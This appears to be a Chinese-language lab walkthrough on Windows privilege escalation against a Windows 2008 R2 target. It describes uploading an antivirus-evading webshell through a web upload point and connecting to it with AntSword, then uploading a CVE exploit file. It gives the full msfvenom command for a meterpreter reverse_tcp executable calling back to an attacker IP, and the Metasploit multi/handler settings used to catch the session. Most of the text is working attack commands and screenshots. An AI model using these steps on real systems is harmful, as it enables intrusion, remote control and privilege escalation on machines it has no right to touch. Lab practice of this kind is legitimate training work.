#Windows提权

例：Windows2008r2

配置vpn（如果不行可以还原快照，选择对应的vpn，输入账号密码）

![image-20210824205251309](Windows提权\image-20210824205251309.png)

kali中安装蚁剑（拖入linux版，连个文件解压，初始化，点位置选第二个文件夹，然后就可以运行了）

在kali中打开浏览器找到上传点，上传as免杀马，蚁剑链接![image-20210824205205278](Windows提权\image-20210824205205278.png)

上传cve文件![image-20210824205133060](Windows提权\image-20210824205133060.png)

现在msf中生成可以反弹的shell打开终端

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.12.171 lport=5678 -f exe -o msf24.exe

![image-20210824210104475](Windows提权\image-20210824210104475.png)

![image-20210824210434053](Windows提权\image-20210824210434053.png)

退到主目录，右键打开终端运行 dir查看，whoami查看当前权限为web

![image-20210824210556320](Windows提权\image-20210824210556320.png)

打开监听端口，进入msf

use exploit/multi/handler

![image-20210824210906728](Windows提权\image-20210824210906728.png)

options查看配置

![image-20210824211103844](Windows提权\image-20210824211103844.png)

设置payload与之前上传的保持一致

设置

lhost  0.0.0.0 为全端口监听，也可以设置成自己的ip

 lport  刚才设置的端口

![image-20210824211415006](Windows提权\image-20210824211415006.png)

exploit  运行监听模块 

![image-20210824211601987](Windows提权\image-20210824211601987.png)

会话反弹回来了

![image-20210824211850910](Windows提权\image-20210824211850910.png)

sessions -i  查看会话

sessions 1  使用

![image-20210824212530201](Windows提权\image-20210824212530201.png)



![image-20210824212919070](Windows提权\image-20210824212919070.png)

![image-20210824213252858](Windows提权\image-20210824213252858.png)

![image-20210824213616273](Windows提权\image-20210824213616273.png)

![image-20210824213939019](Windows提权\image-20210824213939019.png)



















set payload windows/meterpreter/reverse_tcp
set lhost 172.16.12.171
set lport 4444

set exitonsession fasle

